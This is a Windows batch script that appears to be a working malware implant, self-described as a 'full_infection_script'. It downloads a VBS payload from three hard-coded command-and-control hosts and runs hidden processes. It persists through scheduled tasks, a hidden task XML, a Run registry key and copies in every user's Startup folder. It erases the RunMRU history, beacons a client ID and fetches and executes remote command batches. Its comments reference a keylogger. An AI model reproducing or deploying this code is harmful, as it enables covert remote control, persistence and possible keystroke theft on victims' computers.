REM %workdir%\skip_pcmoncheck               --> prevents keylogger from starting
REM owdkeyboardlog.txt
REM %workdir%\%workdir%\reset_<name>loop    --> reset switch -- will be deleted once loops exit
REM %workdir%\killall                       --> master kill switch -- will not start until this is deleted

SET script_version=full_infection_script
SET source=zfei.bat

SET tskname=OWD_retry_infection

SET cmdlistdelaytime=60
SET pingdelaytime=60
SET watchdogtimedelay=30
SET tskxmltime=90

SET mothership=http://s1083932807.online-home.ca
SET mothershipa=https://seashell-raven-793508.hostingersite.com
SET mothershipb=https://darksalmon-crow-356809.hostingersite.com
SET mothershipt=%mothership%

SET scriptpath=%~f0

SET logfpath=

set workdir=%temp%\owd

IF NOT EXIST %workdir% ( 
    MD %workdir%
)

IF EXIST %workdir% ( 
    cd /d %workdir%
)

type nul > %workdir%\test_access

IF NOT EXIST %workdir%\test_access (
    set workdir=C:\ProgramData\owd
    MD %workdir%
    cd /d %workdir%
)

del /f /q %workdir%\test_access

IF NOT EXIST %workdir%\zfei.bat ( 
    copy /Y %scriptpath% %workdir%\zfei.bat 
)

IF NOT EXIST %workdir%\zfei.vbs (
    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothership%/ow/assets/zfei.vbs
    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipa%/ow/assets/zfei.vbs
    start "" /min conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipb%/ow/assets/zfei.vbs
)

echo :beginloop                                                                                                  > %workdir%\infectvbs.bat
echo IF EXIST %workdir%\zfei.vbs (                                                                              >> %workdir%\infectvbs.bat
echo     start "" /min /b conhost.exe --headless wscript.exe /b %workdir%\zfei.vbs                                                                      >> %workdir%\infectvbs.bat
echo ) ELSE (                                                                                                   >> %workdir%\infectvbs.bat
echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothership%/ow/assets/zfei.vbs              >> %workdir%\infectvbs.bat
echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipa%/ow/assets/zfei.vbs             >> %workdir%\infectvbs.bat
echo     start "" /min /b conhost.exe --headless cmd /c curl -sk -o %workdir%\zfei.vbs -G %mothershipb%/ow/assets/zfei.vbs             >> %workdir%\infectvbs.bat
echo     timeout /nobreak 5                                                                                     >> %workdir%\infectvbs.bat
echo     goto :beginloop                                                                                        >> %workdir%\infectvbs.bat
echo )                                                                                                          >> %workdir%\infectvbs.bat

IF EXIST %workdir%\infectvbs.bat (
    start "" /min /b conhost.exe --headless cmd /c %workdir%\infectvbs.bat
)

IF NOT EXIST %workdir%\RunHidden.vbs (
    echo On Error Resume Next > %workdir%\RunHidden.vbs
    echo CreateObject^("Wscript.Shell"^).Run Chr^(34^) ^& WScript.Arguments^(0^) ^& Chr^(34^), 0, False >> %workdir%\RunHidden.vbs
)

IF NOT EXIST %workdir%\RunHiddenPS.vbs (
    echo On Error Resume Next > %workdir%\RunHiddenPS.vbs
    echo CreateObject^("WScript.Shell"^).Run "conhost.exe --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -File " ^& "%workdir%\pc_monitoring.ps1", 0, False >> %workdir%\RunHiddenPS.vbs
)

IF NOT EXIST %workdir%\seaj.bat (
    echo %workdir%\zfei.bat task ^>^> %workdir%\cmds_log_infection.txt 2^>^&1 > %workdir%\vyns.bat
    echo start "" /min /b conhost.exe --headless cmd /c %workdir%\vyns.bat > %workdir%\seaj.bat
)


IF "%~1"=="x" (
    schtasks /delete /TN t /F
    
    goto :init
)


IF "%~1"=="" (
:init    
    IF EXIST %workdir%\RunHidden.vbs (
        IF EXIST %workdir%\seaj.bat (
            schtasks /delete /TN t /F

            schtasks /delete /tn %tskname%_rep /F
            schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo %tskxmltime%

            schtasks /delete /tn %tskname%_repx /F
            schtasks /create /tn %tskname%_repx /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo 1

            schtasks /delete /TN %tskname%_idle /F
            schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" 

            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" %workdir%\seaj.bat

            exit
        )
    )
    
)

SET "cmdname=%~1"

set dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET timestamp=%dt:~0,14%%dt:~15,3%

SET "logfpath=%workdir%\master_%cmdname%_%timestamp%.log"

type nul > %logfpath%

set clientid=xxxxxxxx

IF EXIST %workdir%\client_id (
    set /p clientid=<%workdir%\client_id
) ELSE (
    set num=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
    echo %num:~0,8% > %workdir%\client_id
    set /p clientid=<%workdir%\client_id
)

set clientid=%clientid:~0,8%

echo starting script [ %~1 ] clientid [ %clientid% ] [ %timestamp% ] >> %logfpath%

type nul > %workdir%\skip_pcmoncheck

IF NOT EXIST %workdir%\gtcs.bat ( echo %workdir%\zfei.bat penetrate ^>^> %workdir%\cmds_log_penetrate.txt 2^>^&1 > %workdir%\gtcs.bat )

IF NOT EXIST %workdir%\eiwe.bat ( echo %workdir%\zfei.bat ping      ^>^> %workdir%\cmds_log_ping.txt      2^>^&1 > %workdir%\eiwe.bat )
IF NOT EXIST %workdir%\ghso.bat ( echo %workdir%\zfei.bat cmdlist   ^>^> %workdir%\cmds_log_cmdlist.txt   2^>^&1 > %workdir%\ghso.bat )
IF NOT EXIST %workdir%\uahy.bat ( echo %workdir%\zfei.bat watchdog  ^>^> %workdir%\cmds_log_watchdog.txt  2^>^&1 > %workdir%\uahy.bat )


IF "%cmdname%"=="task" (
    schtasks /delete /TN t /F
    schtasks /delete /TN %tskname%_repx /F
    
    goto :startuplogic
) ELSE (
    goto %cmdname%loop
)

REM execution should not reach here
echo fatal error reached, exiting >> %logfpath%
exit 1


REM uahy
:watchdogloop
    
    IF EXIST %workdir%\killall (
        echo exiting watchdogloop >> %logfpath%
        exit 1
    )

    IF EXIST %workdir%\reset_watchdogloop (
        echo reset watchdogloop >> %logfpath%
        DEL /F /Q %workdir%\reset_watchdogloop
        exit 1
    )    

    SET dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
    SET timestamp=%dt:~0,14%%dt:~15,3%

    echo starting watchdog loop [%timestamp%] >> %logfpath%
    
    REM check if ping and cmdlist are runnning, if not start them up
    FOR %%c IN (eiwe ghso) DO (
        SETLOCAL EnableDelayedExpansion

        IF "%%c"=="eiwe" ( SET "cmdname=ping" )
        IF "%%c"=="ghso" ( SET "cmdname=cmdlist" )
                
        wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\!cmdname!loop_running
        
        FOR %%A IN ("%workdir%\!cmdname!loop_running") DO (
            IF "%%~zA" EQU "0" ( 
                DEL /F /Q %workdir%\!cmdname!loop_running
                
                start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\%%c.bat"
            )  
        )
        
        ENDLOCAL
    )

    echo watchdog loop sleeping >> %logfpath%

    timeout %watchdogtimedelay% /nobreak
    
goto :watchdogloop


:penetrateloop
    
    echo starting penetrateloop >> %logfpath%
    
    dir /B "C:\users\" > %workdir%\dirlist.txt

    SET temppath=

    FOR /F "tokens=*" %%A in ( %workdir%\dirlist.txt ) DO (
        SETLOCAL EnableDelayedExpansion

        set "temppath=C:\Users\%%A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        IF EXIST !temppath! ( 
            copy %workdir%\zfei.bat "!temppath!" 
        )

        ENDLOCAL
    )

    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v %tskname% /t REG_SZ /d %workdir%\zfei.bat /f

    REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

    goto :createtaskxmlbegin
:createtaskxmldone

    schtasks /delete /TN %tskname%_idle /F
    schtasks /create /TN %tskname%_idle /sc onidle /i 1 /F /tr "conhost.exe --headless conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\zfei.bat" 

    schtasks /delete /TN %tskname%_xml /F
    schtasks /create /TN %tskname%_xml /xml %workdir%\task.xml /f
    
    schtasks /delete /tn %tskname%_rep /F
    schtasks /create /tn %tskname%_rep /tr "conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\seaj.bat" /sc minute /mo %tskxmltime%

    echo penetrateloop done >> %logfpath%

    exit
goto :penetrateloop


:pingloop
    
    IF EXIST %workdir%\killall (
        echo exiting pingloop >> %logfpath%
        exit 1
    )

    IF EXIST %workdir%\reset_pingloop (
        echo reset pingloop >> %logfpath%
        DEL /F /Q %workdir%\reset_pingloop
        exit 1
    )
    
    SET dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
    SET ping_timestamp=%dt:~0,14%%dt:~15,3%

    echo starting pingloop %ping_timestamp% %mothership% >> %logfpath%

    set clientid=xxxxxxxx
    
    IF EXIST %workdir%\client_id (
        set /p clientid=<%workdir%\client_id
    ) ELSE (
        set num=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
        echo %num:~0,8% > %workdir%\client_id
        set /p clientid=<%workdir%\client_id
    )
    
    set clientid=%clientid:~0,8%

    echo clientid %clientid% >> %logfpath%

    type nul > %workdir%\ping.txt
    
    set params=--data-urlencode "clientid=%clientid%" 
    set params=%params% --data-urlencode "script_version=%script_version%"
    set params=%params% --data-urlencode "source=%source%"
    
    set "mothership=%mothership: =%"
    echo %mothership% > %workdir%\mothership
    
    curl -v -o %workdir%\ping.txt -G %mothership%/ow/ping.php %params% >> %logfpath% 2>&1

    type %workdir%\ping.txt >> %logfpath%

    IF NOT EXIST %workdir%\ping.txt (
        IF "%mothership%"=="%mothershipt%" (
            set mothership=%mothershipa%
        ) ELSE IF "%mothership%"=="%mothershipa%" (
            set mothership=%mothershipb%        
        ) ELSE IF "%mothership%"=="%mothershipb%" (
            set mothership=%mothershipt%        
        )
        
        del /f /q %workdir%\ping.txt
        goto :pingloop
    )
    
    for %%A in ("%workdir%\ping.txt") do (
        if %%~zA equ 0 (
            IF "%mothership%"=="%mothershipt%" (
                set mothership=%mothershipa%
            ) ELSE IF "%mothership%"=="%mothershipa%" (
                set mothership=%mothershipb%        
            ) ELSE IF "%mothership%"=="%mothershipb%" (
                set mothership=%mothershipt%        
            )
            
            del /f /q %workdir%\ping.txt
            goto :pingloop
        )
    )

    type %workdir%\ping.txt | findstr CLIENT
    
    IF NOT "%ERRORLEVEL%" EQU "0" (
        IF "%mothership%"=="%mothershipt%" (
            set mothership=%mothershipa%
        ) ELSE IF "%mothership%"=="%mothershipa%" (
            set mothership=%mothershipb%        
        ) ELSE IF "%mothership%"=="%mothershipb%" (
            set mothership=%mothershipt%        
        )
        
        del /f /q %workdir%\ping.txt
        goto :pingloop
    )
    
    echo pingloop sleeping %pingdelaytime% >> %logfpath%
    
    timeout %pingdelaytime% /nobreak >NUL 2>&1

    set /a num=%random% %% 60 + 1

    echo pingloop sleeping for additional %num% secs >> %logfpath%

    timeout %num% /nobreak >NUL 2>&1
    
goto :pingloop


:cmdlistloop

    IF EXIST %workdir%\killall (
        echo exiting cmdlistloop >> %logfpath%
        exit 1
    )

    IF EXIST %workdir%\reset_cmdlistloop (
        echo reset cmdlistloop >> %logfpath%
        DEL /F /Q %workdir%\reset_cmdlistloop
        exit 1
    )
    
    SET dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
    SET cmdlist_timestamp=%dt:~0,14%%dt:~15,3%

    echo starting cmdlistloop %cmdlist_timestamp% >> %logfpath%

    set execcmdlist=false

    type %workdir%\ping.txt | findstr execute_cmdlist
    
    IF "%ERRORLEVEL%" EQU "0" (
        echo execute_cmdlist found in ping log >> %logfpath%

        set execcmdlist=true
    )
    
    type nul > %workdir%\ping.txt
    
    timeout 2 /nobreak >NUL 2>&1
    
    set clientid=xxxxxxxx
    
    IF EXIST %workdir%\client_id (
        set /p clientid=<%workdir%\client_id
    ) ELSE (
        set num=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
        echo %num:~0,8% > %workdir%\client_id
        set /p clientid=<%workdir%\client_id
    )

    set clientid=%clientid:~0,8%

    echo clientid %clientid% >> %logfpath%

    IF "%execcmdlist%"=="true" (
        timeout 2 /nobreak >NUL 2>&1

        set params=--data-urlencode "filename=cmd_list.bat"
        set params=%params% --data-urlencode "clientid=%clientid%" 
        set params=%params% --data-urlencode "script_version=%script_version%"
        set params=%params% --data-urlencode "source=%source%" 
        
        set /p mothership=<%workdir%/mothership
        set "mothership=%mothership: =%"

        curl -v -o %workdir%\bbti.bat -G %mothership%/ow/retrieve.php %params% >> %logfpath% 2>&1

        IF EXIST %workdir%\bbti.bat ( 
            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" %workdir%\bbti.bat 
        )
    )
    
    echo cmdlistloop sleeping %cmdlistdelaytime% secs >> %logfpath%

    timeout %cmdlistdelaytime% /nobreak >NUL 2>&1

    set /a num=%random% %% 60 + 1

    echo cmdlistloop sleeping for additional %num% secs >> %logfpath%

    timeout %num% /nobreak >NUL 2>&1

goto :cmdlistloop


:createtaskxmlbegin
type nul > %workdir%\task.xml
echo ^<^?xml version="1.0" encoding="UTF-16"^?^>                                             >> %workdir%\task.xml
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>    >> %workdir%\task.xml
echo ^<Triggers^>                                                                            >> %workdir%\task.xml
echo ^<CalendarTrigger^>                                                                     >> %workdir%\task.xml
echo     ^<Repetition^>                                                                      >> %workdir%\task.xml
echo         ^<Interval^>PT%tskxmltime%M^</Interval^>                                        >> %workdir%\task.xml
echo         ^<StopAtDurationEnd^>false^</StopAtDurationEnd^>                                >> %workdir%\task.xml
echo     ^</Repetition^>                                                                     >> %workdir%\task.xml
echo  ^<StartBoundary^>2026-02-23T17:26:47^</StartBoundary^>                                 >> %workdir%\task.xml
echo  ^<Enabled^>true^</Enabled^>                                                            >> %workdir%\task.xml
echo  ^<ScheduleByDay^>                                                                      >> %workdir%\task.xml
echo    ^<DaysInterval^>1^</DaysInterval^>                                                   >> %workdir%\task.xml
echo  ^</ScheduleByDay^>                                                                     >> %workdir%\task.xml
echo ^</CalendarTrigger^>                                                                    >> %workdir%\task.xml
echo  ^</Triggers^>                                                                          >> %workdir%\task.xml
echo  ^<Settings^>                                                                           >> %workdir%\task.xml
echo    ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>                     >> %workdir%\task.xml
echo    ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>                   >> %workdir%\task.xml
echo    ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>                           >> %workdir%\task.xml
echo    ^<AllowHardTerminate^>true^</AllowHardTerminate^>                                    >> %workdir%\task.xml
echo    ^<StartWhenAvailable^>true^</StartWhenAvailable^>                                    >> %workdir%\task.xml
echo    ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>                     >> %workdir%\task.xml
echo    ^<IdleSettings^>                                                                     >> %workdir%\task.xml
echo      ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>                                           >> %workdir%\task.xml
echo      ^<RestartOnIdle^>true^</RestartOnIdle^>                                            >> %workdir%\task.xml
echo    ^</IdleSettings^>                                                                    >> %workdir%\task.xml
echo    ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>                                    >> %workdir%\task.xml
echo    ^<Enabled^>true^</Enabled^>                                                          >> %workdir%\task.xml
echo    ^<Hidden^>true^</Hidden^>                                                            >> %workdir%\task.xml
echo    ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>                                             >> %workdir%\task.xml
echo    ^<WakeToRun^>false^</WakeToRun^>                                                     >> %workdir%\task.xml
echo    ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^>                                   >> %workdir%\task.xml
echo    ^<Priority^>7^</Priority^>                                                           >> %workdir%\task.xml
echo  ^</Settings^>                                                                          >> %workdir%\task.xml
echo  ^<Actions Context="Author"^>                                                           >> %workdir%\task.xml
echo    ^<Exec^>                                                                             >> %workdir%\task.xml
echo      ^<Command^>conhost.exe --headless cscript.exe //nologo //B %workdir%\RunHidden.vbs %workdir%\zfei.bat^</Command^>      >> %workdir%\task.xml
echo    ^</Exec^>                                                                            >> %workdir%\task.xml
echo  ^</Actions^>                                                                           >> %workdir%\task.xml
echo ^</Task^>                                                                               >> %workdir%\task.xml

goto :createtaskxmldone

:startuplogic

echo starting startuplogic >> %logfpath%

IF EXIST "%workdir%\RunHidden.vbs" (
    REM penetrate
    start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\gtcs.bat"
)

FOR %%c IN (eiwe ghso uahy) DO (
    SETLOCAL EnableDelayedExpansion

    IF "%%c"=="eiwe" ( SET "cmdname=ping" )
    IF "%%c"=="ghso" ( SET "cmdname=cmdlist" )
    IF "%%c"=="uahy" ( SET "cmdname=watchdog" )
    
    wmic process get commandline, processid /value /format:csv | findstr /v wmic | findstr %%c | findstr /v findstr > %workdir%\!cmdname!loop_running

    FOR %%A IN ("%workdir%\!cmdname!loop_running") DO (
        IF "%%~zA" EQU "0" (
            start "" /min /b conhost.exe --headless cscript.exe //nologo //B "%workdir%\RunHidden.vbs" "%workdir%\%%c.bat"
        )
    )

    ENDLOCAL
)


:infectiondone
echo infection complete, done >> %logfpath%

exit
